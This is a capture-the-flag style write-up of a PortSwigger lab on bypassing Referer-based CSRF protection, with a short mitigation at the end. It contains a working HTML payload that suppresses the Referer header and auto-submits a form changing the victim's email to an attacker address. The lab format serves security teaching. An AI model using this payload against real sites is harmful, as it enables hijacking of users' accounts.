# Lab 06 — CSRF where Referer validation depends on header being present

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-referer-validation/lab-referer-validation-depends-on-header-being-present)

**Entry point:** the Referer check only runs **if the header exists** — so
remove it.

## Solution

1. In Repeater: tampered token → rejected; **no Referer at all** → accepted
   (the validation is skipped when the header is missing).
2. Make the victim's browser omit the Referer with a meta tag on the
   exploit page:

```html
<meta name="referrer" content="no-referrer">
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">
  <input type="hidden" name="email" value="attacker@evil-you.net">
</form>
<script>document.forms[0].submit();</script>
```

3. Deliver to victim — no header, no check, email changed — lab solved.

## Mitigation

Validate the token always; if you check Referer, treat a missing header as
a rejection too.
